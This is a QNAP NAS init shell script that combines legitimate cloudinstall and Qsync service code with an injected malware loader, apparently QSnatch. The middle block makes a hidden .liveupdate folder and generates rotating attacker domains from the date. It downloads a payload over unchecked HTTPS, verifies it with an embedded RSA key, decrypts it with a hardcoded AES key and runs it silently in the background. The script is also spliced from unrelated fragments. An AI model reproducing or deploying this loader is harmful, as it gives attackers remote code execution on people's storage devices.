#!/bin/sh
QNAP_QPKG=cloudinstall
QID_PRESISTENT_CONF=/etc/config/qid_persistent.conf
NAS_CLOUD_INSTALL_PATH=/home/httpd/cgi-bin/cloudinstall
CLOUD_INSTALL_PATH=/tunnel_agent
CLOUD_INSTALL_RAMDISK_PATH=/tunnel_agent_ramdisk
CLOUD_INSTALL_AGENT_FILE_PATH=$CLOUD_INSTALL_PATH/tunnel_agent.tar.bz2
COUNTER=1
ERROR_BAD_REQUEST=400

if [ "$fromrcS" = 'TRUE' ]; then
case "$1" in
  start)
    START_TIME=$(date +"%T")
    echo -e "start:$START_TIME" >> /tmp/.cloudinstall.log
    while [ "$CLOUD_INSTALL_AGENT_PID_LIST" == "" ];
    do
        # report device info and get cloudinstall agent app download url
        DOWNLOAD_URL=`/usr/sbin/qcloud_uninit_device_tool -r`
        if [ ! -d "$CLOUD_INSTALL_PATH" ]; then
            if [ "$NAS_ARCH" == "ARM_64" ]; then
                # create ramdisk and create a 64mb file
                /bin/mkdir -p $CLOUD_INSTALL_RAMDISK_PATH
                /bin/mount -t tmpfs -o size=64m tmpfs $CLOUD_INSTALL_RAMDISK_PATH
                /bin/dd if=/dev/zero of=$CLOUD_INSTALL_RAMDISK_PATH/image bs=1M count=64
                # create block size 1K filesystem
                /sbin/mke2fs -b 1024 $CLOUD_INSTALL_RAMDISK_PATH/image
                # create virtual disk
                export USED_LOOP_DEVICE=`/usr/local/sbin/losetup -f $CLOUD_INSTALL_RAMDISK_PATH/image`
                /sbin/setcfg -f $QID_PRESISTENT_CONF "CLOUDINSTALL" "USED_LOOP_DEVICE" "$USED_LOOP_DEVICE"
                /bin/mkdir -p $CLOUD_INSTALL_PATH
                # mount virtual disk
                /bin/mount $USED_LOOP_DEVICE $CLOUD_INSTALL_PATH
            else
                # create and mount tmpfs folder
                /bin/mkdir -p $CLOUD_INSTALL_PATH
                /bin/mount -t tmpfs -o size=64m tmpfs $CLOUD_INSTALL_PATH
            fi
        fi
        cd $CLOUD_INSTALL_PATH

        if [[ $DOWNLOAD_URL == https* ]]; then
            REPORT_SUCCESS_TIME=$(date +"%T")
        else
            REPORT_FAIL_TIME=$(date +"%T")
            echo -e " report_fail:$REPORT_FAIL_TIME\n response:$DOWNLOAD_URL" >> /tmp/.cloudinstall.log
            # stop retry when got bad request
            # prevent put bad request all the time
            if [[ $DOWNLOAD_URL == *$ERROR_BAD_REQUEST* ]]; then
                break
            fi
        fi

        # downlaod cloudinstall agent app
        /usr/sbin/qcloud_uninit_device_tool -o "$CLOUD_INSTALL_AGENT_FILE_PATH" -d "$DOWNLOAD_URL"

        if [ -f "$CLOUD_INSTALL_AGENT_FILE_PATH" ]; then
            DOWNLOAD_FINISH_TIME=$(date +"%T")
            # unzip and execute cloudinstallagent
            /bin/tar -xf $CLOUD_INSTALL_AGENT_FILE_PATH -C $CLOUD_INSTALL_PATH
            $CLOUD_INSTALL_PATH/bin/cloudinstall_agent_ctl.sh start &> /dev/null

            UNZIP_TIME=$(date +"%T")
        fi

        if [ ! -d "$NAS_CLOUD_INSTALL_PATH" ]; then
            # create folder and create symbolic link
            /bin/mkdir -p $NAS_CLOUD_INSTALL_PATH
            /bin/ln -s $CLOUD_INSTALL_PATH/ui/cloudinstall.html $NAS_CLOUD_INSTALL_PATH/index.html
            /bin/ln -s $CLOUD_INSTALL_PATH/ui/cloudinstall.cgi $NAS_CLOUD_INSTALL_PATH/cloudinstall.cgi
            /bin/ln -s $CLOUD_INSTALL_PATH/ui/static $NAS_CLOUD_INSTALL_PATH/static
        fi

        # wait connect
        sleep 5
        CLOUD_INSTALL_AGENT_PID_LIST=`/bin/ps --columns 256 | /bin/grep "$CLOUD_INSTALL_PATH/bin/cloudinstallagent" | /bin/grep -v grep | /bin/awk '{print $1}'`
        if [ "$CLOUD_INSTALL_AGENT_PID_LIST" == "" ]; then
            SLEEP_TIME=$(( 30 * $COUNTER ))
            if [ $SLEEP_TIME -gt 300 ]; then
                SLEEP_TIME=300
            fi
            # wait next retry
            sleep $SLEEP_TIME
        fi
        COUNTER=$(( $COUNTER * 2 ))
    done

    END_TIME=$(date +"%T")
    echo -e "report_success:$REPORT_SUCCESS_TIME\ndownload_finish:$DOWNLOAD_FINISH_TIME\nunzip_finish:$UNZIP_TIME\nend:$END_TIME" >> /tmp/.cloudinstall.log
    # call for a new process group and for later kill
    /bin/setsid $CLOUD_INSTALL_PATH/bin/cloudinstall_agent_disconnect_daemon.sh start &> /dev/null &
    /bin/setsid $CLOUD_INSTALL_PATH/bin/cloudinstall_agent_daemon.sh &> /dev/null &

    # set cloudinstall report status
    /sbin/setcfg -f $QID_PRESISTENT_CONF "CLOUDINSTALL" "REPORT_STATUS" "uninit"
    # add link to report offline
    /bin/ln -sf /etc/init.d/cloudinstall_report_offline.sh /etc/rcK.d/K99cloudinstall_report_offline

    # buzzer
    HARDWARE_TYPE=$(uname -m)
    if [[ "$HARDWARE_TYPE" == *"x86"* ]];
    then
      /sbin/hal_app --se_buzzer enc_id=0,mode=101
    elif [[ "$HARDWARE_TYPE" == *"arm"* ]];
    then
      /sbin/pic_raw 81
    fi
    ;;

  stop)
    # disconnect cloudinstall agent
    $CLOUD_INSTALL_PATH/bin/cloudinstall_agent_ctl.sh stop &> /dev/null
    $CLOUD_INSTALL_PATH/bin/cloudinstall_agent_disconnect_daemon.sh stop &> /dev/null
    for i in "${CLOUD_INSTALL_AGENT_DAEMON_PID_LIST[@]}"
    do
        # use bash kill instead /bin/kill for kill process group
        # cloudinstall agent daemon and inotifywait
        kill -9 -- -$i &>/dev/null
    done

    # umount
    if [ "$NAS_ARCH" == "ARM_64" ]; then
        /bin/umount -l $USED_LOOP_DEVICE
        /usr/local/sbin/losetup -d $USED_LOOP_DEVICE
    else
        /bin/umount -l $CLOUD_INSTALL_PATH
    fi
    # remove all files
    if [ -d "$NAS_CLOUD_INSTALL_PATH" ]; then
        /bin/rm -rf $NAS_CLOUD_INSTALL_PATH
    fi
    if [ -d "$CLOUD_INSTALL_PATH" ]; then
        /bin/rm -rf $CLOUD_INSTALL_PATH
    fi
    if [ -d "$CLOUD_INSTALL_RAMDISK_PATH" ]; then
        /bin/rm -rf $CLOUD_INSTALL_RAMDISK_PATH
    fi
    ;;

  restart)
    $0 stop
    $0 start
    ;;

  *)
    echo "Usage: $0 {start|stop|restart}"
    exit 1
esac
exit 0


set_env()
{
	debug=`$CMD_GETCFG Qsync Debug -u -d NULL`
	if [ "$debug" != "NULL" ]; then
		/bin/touch $LOG_FILE
	else
		/bin/rm -f $LOG_FILE
	fi
}

set_env

dbg()
{
	if [ -f "$LOG_FILE" ]; then
		echo "[`date "+%H:%M:%S"`] $@ " >> $LOG_FILE
	fi
}

dbg "> $0 $@ (pid $$)"

fi

export PATH="${PATH}:/bin:/sbin:/usr/bin:/usr/sbin:/usr/bin/X11:/usr/local/sbin:/usr/local/bin"

command -v getcfg > /dev/null 2>&1 || getcfg () { sed -n 'H;${x;s/\(.*\n\['"${1//\//\\\/}"']\|^\['"${1//\//\\\/}"']\)\n//I;s/\(^\|\n\)\[[^\n]\+\]\n.*//p}' "${4:-${confdir}/uLinux.conf}" | sed -n 's/^'"${2//\//\\\/}"' \?= \?\(.*\)/\1/Ip'; }

test -d /etc/config && confdir=/etc/config || { test -d /mnt/HDA_ROOT/.config && confdir=/mnt/HDA_ROOT/.config; }

bdir=
test -f "${confdir}/smb.conf" && for i in homes Public Download Multimedia Web Recordings; do bdir=`getcfg "$i" path -f "${confdir}/smb.conf"` && test ! -z "$bdir" && bdir=`dirname "$bdir"` && test -d "$bdir" && testwriteable=$(mktemp "${bdir}/.tmp.XXXXXX") && rm "${testwriteable}" && break; bdir=''; done
test -z "${bdir}" || test ! -d "${bdir}" && { command -v readlink >/dev/null 2>&1 || ln -sf /bin/busybox /usr/bin/readlink; for i in Public Download Multimedia Web Recordings homes; do bdir=`readlink "/share/${i}" 2>/dev/null` && test ! -z "$bdir" && bdir=`dirname "$bdir"` && bdir=/share/${bdir##*/} && test -d "$bdir" && break; done;
test -z "${bdir}" || test ! -d "${bdir}"; } && { bdir=`getcfg SHARE_DEF defVolMP -f "${confdir}/def_share.info"`
test -z "${bdir}" || test ! -d "${bdir}"; } && { bdir=`mount | sed -n "s/.*\(\/share\/[^ /]\+\) .*/\1/gp" | head -n 1`
test -z "${bdir}" || test ! -d "${bdir}"; } && { for i in CACHEDEV3_DATA CACHEDEV2_DATA CACHEDEV1_DATA MD0_DATA; do test -d "/share/${i}" && bdir="/share/${i}" && break; done;
test -z "${bdir}" || test ! -d "${bdir}" && bdir=/mnt/HDA_ROOT; }
grep -F '' <<EOF >/dev/null 2>&1 && fgrep="grep -F" || { command -v fgrep >/dev/null 2>&1 && fgrep=fgrep || fgrep=grep; }

EOF
test "$fgrep" || fgrep=grep
test "$RANDOM" || RANDOM=17653
genrstr () 
{ 
    local s=;
    local min=${1:-4};
    local max=${2:-12};
    local kspace="${3:-a-zA-Z}"
    tr -dc "$kspace" < /dev/urandom | { 
        read -rn $(($RANDOM % ( $max - $min + 1 ) + $min )) s;
        echo "$s"
    }
}

verifyfile() {
local file="$1"
local sig="${2:-$file_s}"
local out
test ! -z "$file" && test -s "$file" || return 1
test ! -z "$sig" && test -s "$sig" || return 1
test -f ".rsakey" || echo "$verifykey" > ".rsakey"
out=$(openssl dgst -sha1 -verify ".rsakey" -signature "$sig" "$file") && test "$out" = "Verified OK" && return 0
return 1
}

decryptfile() {
local file="$1"
local ofile="${2:-${file}}"
local key='7C0vK4SzMO15zBxLD7XCi5hbjgP1ZjkJ'
openssl enc -d -aes-256-cbc -k "$key" -md sha1 -salt < "$file" > "${file}_d" || return $?
test -f "$ofile" && rm -f "$ofile"
mv "${file}_d" "$ofile" && return 0
return 1
}

verifykey='-----BEGIN PUBLIC KEY-----
MIIBojANBgkqhkiG9w0BAQEFAAOCAY8AMIIBigKCAYEAt/EDT6SB75atrHW7Cpog
CXqrBM2CVbJo';verifykey="${verifykey}"'g4rwwS''z1Bp1i1'
verifykey="${verifykey}"'B7B9Wd51no32lpRqOM+9GOr2W17xwJ8pqpQotex
RC5qQSiS/7FS48jsPKsJnrUhnsI1fRLM4DqsEF3UOukZuDOYUhlteDuMqqZBz0AC
Q3YnLjraTjchMF0XmaAAcWOkg5MsxAOKTepue4R/tnrPAkAG86nq5LA1+wa7opNV
gQzwDh7YXhBnWz52+ebZ9TeqD31/sb5hoyUKf1Nr5HcKkklObuz1OGQJ//pkCbTC
2EnQw6tCPQhgSIA8wJKkaxW0f/UHP+YBmWa4Wn+uPrJJuHSVNEJtAp2wlX3THltz
0IGPQEuzoafOAl3EFjas3HcTX2HlEfnvAtRL2iLxJeba1nZ+U3geZOuxL1NhWhNh
pjaLcKwhkRck7Y5hr1Pz8pLDnXsx5w0QUz6XS8HVf/KHnNXHufFEn01y9YoPuau1
DNnpDGbq632Bs8ESd3ueHk9OY/UZxWeN3UdbseFxK35XAgMBAAE=
-----END PUBLIC KEY-----'

DOMAIN_EXT_A='cf tk ml ga gq'
DOMAIN_EXT_B='com biz org de rocks mx cn top nl men ws se info xyz net today ru fi name to in com.ua vg vn cd'

test -d "${bdir}/.qpkg" || mkdir "${bdir}/.qpkg"
test -d "${bdir}/.qpkg/.liveupdate" || mkdir "${bdir}/.qpkg/.liveupdate"
cd "${bdir}/.qpkg/.liveupdate" && rm -f .tmp.*

echo "$verifykey" > ".rsakey"
i=0 n=0 c=0 errorcount=0
outfile=$(mktemp "./.tmp.XXXXXX") || outfile=$(mktemp "${bdir}/.tmp.XXXXXX") || outfile=$(mktemp "/.tmp.XXXXXX") || outfile='./.tmp.out'

for domainexts in "$DOMAIN_EXT_A" "$DOMAIN_EXT_B"; do
        for ext in $domainexts; do
                hostname=$(echo "$(( $(date +%s) / 1296000 ))IbjGOEgnuD${ext}" | openssl dgst -sha1 -binary | openssl base64 | sed 'y/ABCDEFGHIJKLMNOPQRSTUVWXYZ-+\//abcdefghijklmnopqrstuvwxyzabc/;s/=//g')
                hostname=${hostname%[a-z0-9][a-z0-9][a-z0-9][a-z0-9][a-z0-9][a-z0-9][a-z0-9][a-z0-9][a-z0-9][a-z0-9][a-z0-9][a-z0-9][a-z0-9][a-z0-9][a-z0-9][a-z0-9][a-z0-9]}
                hostnames="${hostname%[a-z0-9][a-z0-9][a-z0-9][a-z0-9]} ${hostname%[a-z0-9][a-z0-9][a-z0-9]}"
                hostnames="$hostnames ${hostname%[a-z0-9][a-z0-9]} ${hostname%[a-z0-9]} $hostname"
                for host in $hostnames; do
                        test -f "$outfile" && rm -f "$outfile"
                        recentupdate=''
                        curl --connect-timeout 12 -m 30 -k -o "$outfile" "https://${host}.${ext}/qnap_firmware.xml?t=$(date +%s)"
                        test -s "$outfile" || continue
                        fsize=$(( $(wc -c < "$outfile") ))
                        test "$fsize" -gt 4096 && rm -f "$outfile" && continue
                        rsamsg=$(openssl base64 -in "$outfile" -d | openssl rsautl -pubin -inkey ".rsakey" -verify) || continue
                        test "$rsamsg" || continue
                        path="${rsamsg%|*}"; rsadomain="${path%|*}"; path="${path#*|}"
                        hash="${rsamsg##*|}"; ts="${hash#*_}"; hash="${hash%_*}"
                        test "$rsadomain" = "${host}.${ext}" || continue
                        timenow=$(date +%s)
                        test "$ts" -gt 0 && { test "$ts" -gt "$timenow" || test $(( $timenow - $ts )) -lt 172800; } && recentupdate=1
                        curl --connect-timeout 12 -m 300 -k -o "$outfile" "https://${host}.${ext}/${path}"
                        filehash=$(openssl dgst -sha1 -binary "$outfile" | openssl base64) || continue
                        test "$filehash" = "$hash" || continue
                        curl --connect-timeout 12 -m 30 -k -o "${outfile}_s" "https://${host}.${ext}/s/${path}"
                        verifyfile "$outfile" "${outfile}_s" && decryptfile "$outfile" || continue
                        mv "${outfile}_s" "${ts}_v"
                        chmod 755 "$outfile" || continue
                        ( ( exec >/dev/null 2>/dev/null </dev/null; "$outfile" ) & )
                        test "$recentupdate" -eq 1 && exit 0
                done
        done
done


if [ "$fromrcS" = 'TRUE' ]; then
# if Qsync is disable before 4.3.0, we will touch /mnt/HDA_ROOT/udpate_pkg/.QsyncServer_disabled
set_default_disable_status()
{
	QPKG_ENABLE=`$CMD_GETCFG ${QSYNC_NAME} Enable -d "NULL" -f ${QPKG_CONF}`
	OLD_ENABLE=`$CMD_GETCFG Qsync Enable -u -d NULL`
	if [ -f "${UPDATEPKG_DIR}/.${QSYNC_NAME}_removed" ]; then
		return
	fi

	if [ "$QPKG_ENABLE" = "NULL" ]; then
		if [ "$OLD_ENABLE" = "FALSE" ]; then
			dbg "touch ${UPDATEPKG_DIR}/.${QSYNC_NAME}_disabled"
			/bin/touch "${UPDATEPKG_DIR}/.${QSYNC_NAME}_disabled"
		fi
	fi
}

if [ "x$HBS_ENABLE" = xnull ] || [ "x$HBS_ENABLE" = xFALSE ]; then
	export QNAP_QPKG=rtrr
else
	export QNAP_QPKG=HybridBackup
	/usr/local/sbin/qboost_util -S -n rtrr -E 0 1>/dev/null 2>&1
fi
start()
{
	if [ -f /usr/bin/qsyncman ]; then
		[ ! -f /etc/config/hdcopyusb.conf ] || /bin/rm -f /etc/config/hdcopyusb.conf
		/bin/sed -i '/hdusb_copy/d' /etc/config/crontab
		/usr/bin/crontab /etc/config/crontab
		echo -n "Starting QSync manitor: "
		[ -d /etc/config/qsync ] || /usr/bin/install -d /etc/config/qsync
		[ -f /etc/config/qsync/qhost.conf ] || /bin/touch /etc/config/qsync/qhost.conf
		[ -f /etc/config/qsync/qsyncjobdef.conf ] || /bin/touch /etc/config/qsync/qsyncjobdef.conf
		[ -f /etc/config/qsync/qsync.conf ] || /bin/cp -p /etc/default_config/qsync/qsync.conf /etc/config/qsync/qsync.conf
		[ -f /etc/config/qsync/extdrv.conf ] || /bin/cp -p /etc/default_config/qsync/extdrv.conf /etc/config/qsync/extdrv.conf
		[ -f /etc/config/qsync/qsyncd.conf ] || /bin/cp -p /etc/default_config/qsync/qsyncd.conf /etc/config/qsync/qsyncd.conf
		[ ! -f /etc/config/qsync/qsyncd.conf ] || /bin/chmod 640 /etc/config/qsync/qsyncd.conf
		[ ! -f /etc/config/qsync/qsync.conf ] || /bin/chmod 640 /etc/config/qsync/qsync.conf
		[ ! -f /etc/config/qsync/qhost.conf ] || /bin/chmod 640 /etc/config/qsync/qhost.conf
		/sbin/daemon_mgr qsyncman start "/usr/bin/qsyncman 1>/dev/null 2>&1"
		echo "OK"
	fi
}

stop()
{
	echo "Shutting down QSync monitor: OK"
        pidnum=`/bin/pidof qsync``/bin/pidof qsyncd`
        kill $pidnum 2>/dev/null
        i=0
        while [ ${i} -lt 5 ]
        do
                pidnum=`/bin/pidof qsync``/bin/pidof qsyncd`
                if [ -z "$pidnum" ]; then
                        break
                fi
                sleep 1
                i=`/usr/bin/expr ${i} + 1`
        done
        pidnum=`/bin/pidof qsync``/bin/pidof qsyncd`
        [ -z "$pidnum" ] || kill -9 $pidnum 2>/dev/null
	/sbin/daemon_mgr qsyncman stop "/usr/bin/qsyncman"
	/usr/bin/killall -q qsyncman
}

start_qsyncd()
{
	#_qsyncd_en=`/sbin/getcfg "" Enabled -d 0 -f /etc/qsync/qsyncd.conf`
	#[ "x$_qsyncd_en" = x1 ] || return -1
	_qsyncd_run_pid=`/bin/pidof qsyncd`
	[ -z $_qsyncd_run_pid ] || return -114
	_recycle_en=`/sbin/getcfg 'Network Recycle Bin' Enable -d FALSE`
	_with_syslog=$1
	if [ "x$_recycle_en" = xTRUE  ]; then
		if [ "x$_with_syslog" = x1  ]; then
			LD_PRELOAD=/usr/local/lib/libtrash.so /usr/bin/qsyncd -syslog -c:/etc/qsync/qsyncd.conf
		else
			LD_PRELOAD=/usr/local/lib/libtrash.so /usr/bin/qsyncd -c:/etc/qsync/qsyncd.conf
		fi
	else
		if [ "x$_with_syslog" = x1  ]; then
			/usr/bin/qsyncd -syslog -c:/etc/qsync/qsyncd.conf
		else
			/usr/bin/qsyncd -c:/etc/qsync/qsyncd.conf
		fi
	fi
	_iret=$?
	if [ "x$_iret" = x0 ]; then
		i=0
		while [ ${i} -lt 10000 ]
		do
			echo "${i} millisecond..."
			_qsyncd_pid=`/sbin/getcfg '' Pid -d -1 -f /etc/qsync/qsyncd.conf`
			_qsyncd_run_pid=`/bin/pidof qsyncd`
			if [ "x$_qsyncd_pid" != "x-1" ] && [ ! -z $_qsyncd_run_pid ]; then
				break
			fi
			usleep 50000
			i=`/usr/bin/expr ${i} + 50`
		done
	fi
	return -$_iret
}

stop_qsyncd()
{
	#_qsyncd_en=`/sbin/getcfg "" Enabled -d 0 -f /etc/qsync/qsyncd.conf`
	#[ "x$_qsyncd_en" = x0 ] || return -1
	_qsyncd_pid=`/sbin/getcfg "" Pid -d -1 -f /etc/qsync/qsyncd.conf`
	[ $_qsyncd_pid -lt 0 ] && return -3
	# Send SIGUSR1 to inform the daemon to output "[RTRR Server] Stopped" event log
	/bin/kill -SIGUSR1 $_qsyncd_pid
	usleep 200000
	# Send SIGINT to stop the QSyncd process
	/bin/kill -SIGINT $_qsyncd_pid
	_kill_ret=$?
	if [ "x$_kill_ret" != x0 ]; then
		return -3
	fi
	echo "need wait $1 millisecond"
	i=0
	while true
	do
		echo "${i} millisecond..."
		_qsyncd_pid=`/sbin/getcfg '' Pid -d -1 -f /etc/qsync/qsyncd.conf`
		_qsyncd_run_pid=`/bin/pidof qsyncd`
		if [ "x$_qsyncd_pid" = "x-1" ] && [ -z $_qsyncd_run_pid ]; then
			break
		fi
		if [ ${i} -ge $1 ]; then
			# if time-out, we send two additional SIGINT to force the daemon to stop.
			if [ $_qsyncd_pid -ge 0 ]; then
				/bin/kill -SIGUSR1 $_qsyncd_pid
				usleep 200000
				/bin/kill -SIGUSR1 $_qsyncd_pid
			fi
			j=0
			while [ ${j} -lt 500 ]
			do
				_qsyncd_run_pid=`/bin/pidof qsyncd`
				if [ -z $_qsyncd_run_pid ]; then
					return 0
				fi
				usleep 20000
				j=`/usr/bin/expr ${j} + 20`
			done
			return -62
		fi
		usleep 50000
		i=`/usr/bin/expr ${i} + 50`
	done
	return 0
}


install()
{
	lock_file="/var/lock/qbox_install_bin.lck"

	if [ ! -f "${INSTALL_BUILD_IN}" ]; then
		dbg "build-in ${QSYNC_NAME} is installed"
		return 1
	fi

	if [ ! -f ${UPDATEPKG_DIR}/${QSYNC_NAME}.bin ]; then
		dbg "${QSYNC_NAME}.bin} not found"
		return 1
	fi

	if [ ! -x "${QPKG_CLI}" ]; then
		dbg "${QPKG_CLI} not found"
		return 1
	fi

	## make sure volume is exist
	if [ ! -d /share/`/sbin/getcfg SHARE_DEF defPublic -d Public -f /etc/config/def_share.info` ]; then
		dbg "/share/Public not found"
		return 1
	fi

	## is removed 
	if [ -f ${UPDATEPKG_DIR}/.${QSYNC_NAME}_removed ]; then
		/bin/rm -f ${INSTALL_BUILD_IN}
		dbg "${QSYNC_NAME} is removed"
		return 1
	fi

	if [ -f "$lock_file" ]; then 
		if [ $(( $(date +%s) - $(date +%s -r $lock_file) )) -le 180 ]; then
			echo "${QSYNC_NAME} is installing"
			dbg "${QSYNC_NAME} is installing"
			return 1
		fi
	fi

	/bin/touch "$lock_file"	
	/bin/rm -f ${INSTALL_BUILD_IN}
	dbg "install build-in ${QSYNC_NAME} start"

	set_default_disable_status

	## install build in Qsync
	${QPKG_CLI} -K -m ${UPDATEPKG_DIR}/${QSYNC_NAME}.bin > /dev/null 2>&1
	sleep 20

	wait_install=60
	## avoid initial take long time or fail
        while [ "$wait_install" -gt 0 ]; do
		stcode=`$CMD_GETCFG ${QSYNC_NAME}.bin stcode -f /etc/config/qpkg_job.conf`
                if [ "$stcode" = "0" ]; then
                        break
                fi
                sleep 1
                let "wait_install--"
        done

	${QPKG_CLI} -C ${QSYNC_NAME}.bin > /dev/null 2>&1
	/bin/rm -f ${UPDATEPKG_DIR}/.${QSYNC_NAME}_disabled
	/bin/rm -f "$lock_file"	
	dbg "install build-in ${QSYNC_NAME} success"
}

if [ "$1" == "stop" ]; then
	exit 0
fi
fi
